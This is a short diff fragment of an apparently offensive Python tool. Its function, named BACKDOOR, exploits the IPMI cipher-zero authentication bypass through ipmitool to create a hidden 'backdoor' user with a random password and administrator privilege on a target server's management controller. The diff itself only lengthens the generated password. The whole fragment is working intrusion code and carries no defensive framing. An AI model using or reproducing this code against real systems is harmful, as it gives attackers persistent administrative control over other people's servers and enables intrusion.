@@ -31,7 +31,7 @@ def BACKDOOR(USER, HOST):
  P2DATA = PDATA[1].split("\\n")
  USERCOUNT = str(int(P2DATA[0].strip())+1)
  USERNAME = "backdoor"+USERCOUNT
- PW = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
+ PW = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(14))
  os.popen("ipmitool -I lanplus -C 0 -U "+USER+" -P hacked -H "+HOST+" user set name "+USERCOUNT+" "+USERNAME)
  os.popen("ipmitool -I lanplus -C 0 -U "+USER+" -P hacked -H "+HOST+" user set password "+USERCOUNT+" "+PW)
  os.popen("ipmitool -I lanplus -C 0 -U "+USER+" -P hacked -H "+HOST+" user priv "+USERCOUNT+" 4")
